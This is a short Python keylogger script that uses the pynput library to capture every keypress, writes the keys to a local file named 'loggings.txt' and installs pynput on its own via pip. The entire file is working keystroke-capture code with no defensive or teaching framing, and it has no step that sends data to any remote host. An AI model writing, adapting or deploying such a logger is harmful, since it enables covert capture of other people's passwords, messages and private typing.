from pynput import keyboard
import subprocess

def keypressed(key):
    print(str(key))
    with open("loggings.txt",'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            if key == keyboard.Key.enter:
                logkey.write('\n')
            elif key == keyboard.Key.space:
                logkey.write(' ')
            elif key == keyboard.Key.backspace:
                logkey.write('\b')
            else:
                logkey.write(f'<{key}>')


if __name__ == "__main__":
    try:
        subprocess.run(["pip", "install", "pynput"])
    except:
        print("already installed")

    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()


